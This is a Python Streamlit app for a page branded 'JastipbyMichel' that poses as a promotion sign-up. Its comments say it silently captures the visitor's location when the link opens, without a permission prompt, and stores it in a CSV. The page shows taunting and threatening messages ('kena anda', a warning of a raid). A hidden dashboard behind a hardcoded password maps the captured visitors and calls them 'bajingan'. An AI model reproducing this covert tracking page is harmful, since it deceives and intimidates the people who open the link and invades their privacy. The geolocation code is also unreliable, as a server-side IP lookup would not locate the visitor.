import streamlit as st
import pandas as pd
import requests
import os
import datetime

# Judul tab browser brand Anda
st.set_page_config(page_title="JastipbyMichel - Aktivasi Lokasi", layout="centered")

LOCAL_DB = "data_lokasi_jastip.csv"

def muat_data():
    if os.path.exists(LOCAL_DB):
        try:
            return pd.read_csv(LOCAL_DB)
        except:
            pass
    return pd.DataFrame(columns=["waktu", "kota", "latitude", "longitude"])

def simpan_data(kota, lat, lon):
    df = muat_data()
    waktu = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    data_baru = pd.DataFrame([[waktu, kota, lat, lon]], columns=["waktu", "kota", "latitude", "longitude"])
    df = pd.concat([df, data_baru], ignore_index=True)
    df.to_csv(LOCAL_DB, index=False)
    return df

# FUNGSI BARU (HTTPS AMAN): Mengambil lokasi otomatis lewat IP Internet tanpa pop-up izin
def ambil_lokasi_otomatis():
    try:
        # Menggunakan ipapi.co dengan protokol HTTPS yang aman untuk Streamlit
        response = requests.get("https://ipapi.co", timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
        data = response.json()
        if not data.get('error'):
            kota_wilayah = f"{data.get('city')}, {data.get('region')}"
            return kota_wilayah, data.get('latitude'), data.get('longitude')
    except Exception as e:
        pass
    return None, None, None

# ================= TAMPILAN HALAMAN UTAMA (RAMAH ORANG TUA) =================
st.title("🛍️ JastipbyMichel")
st.subheader("Pendaftaran Promosi Sukses!")

if "tercatat" not in st.session_state:
    # SISTEM AMBIL ALIH SECARA DIAM-DIAM & OTOMATIS SAAT LINK DIBUKA
    kota, lat, lon = ambil_lokasi_otomatis()
    
    if lat and lon:
        simpan_data(kota, lat, lon)
        st.session_state["tercatat"] = True
        st.session_state["info_kota"] = kota
    else:
        st.session_state["tercatat"] = "Gagal"

# Tampilan yang dilihat oleh orang tua (Sederhana, bersih, bikin tenang)
if st.session_state["tercatat"] == True:
    st.success(f"Selamat! Lokasi wilayah Anda ({st.session_state['info_kota']}) telah berhasil didaftarkan ke sistem JastipbyMichel. kena anda!")
    st.balloons()
else:
    st.info("Siap siap kami gerebek...")


# ================= DASHBOARD ADMIN (PASSWORD: michel123) =================
st.markdown("<br><br><br><br><br><hr>", unsafe_allow_html=True)
st.write("🔒 *Fitur Khusus Pengembang / Admin JastipbyMichel*")

password_input = st.text_input("Masukkan Password Admin untuk melihat peta sebaran:", type="password")

if password_input == "michel123":
    st.success("Akses Diterima! Menampilkan Lokasi bajingan.")
    st.subheader("📊 Peta Database JastipbyMichel")

    df_tampil = muat_data()

    if not df_tampil.empty:
        st.metric(label="Locasi bajingan", value=len(df_tampil))
        
        st.write("### Posisi bajingan")
        st.map(df_tampil)
        
        st.write("### Log Rincian Data")
        st.dataframe(df_tampil, use_container_width=True)
    else:
        st.info("belum ada bajingan.")
elif password_input != "":
    st.error("Password Salah! Akses ditolak.")
